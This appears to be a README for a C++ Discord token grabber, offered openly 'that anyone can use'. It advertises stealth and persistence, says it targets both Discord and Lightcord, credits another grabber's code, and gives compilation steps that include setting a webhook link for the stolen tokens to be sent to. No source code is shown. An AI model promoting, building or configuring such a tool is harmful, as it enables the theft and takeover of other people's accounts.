A C++ token grabber that anyone can use, credit to [NightFallGT](https://github.com/NightfallGT/Discord-Token-Grabber/blob/master/Token-Disc/Token-Disc.cpp)
and his token grabber, I used his "findMatch" function in order to fix a couple issues I was having.

## Pros
     - Silence and persistence
     - Supports the latest discord updates
     - Grabs Lightcord and Discord
     - Fast, Its made in C++  
## Cons
     - Does not support early windows versions
     - Hard to understand for beginners in programming

**Gladly, the pros outweigh the cons.**


# Compilation

Next, open the .sln file and once loaded go to the `Source.cpp` file, then find the webhook link
inside of the sprintf call and change it to desired link.
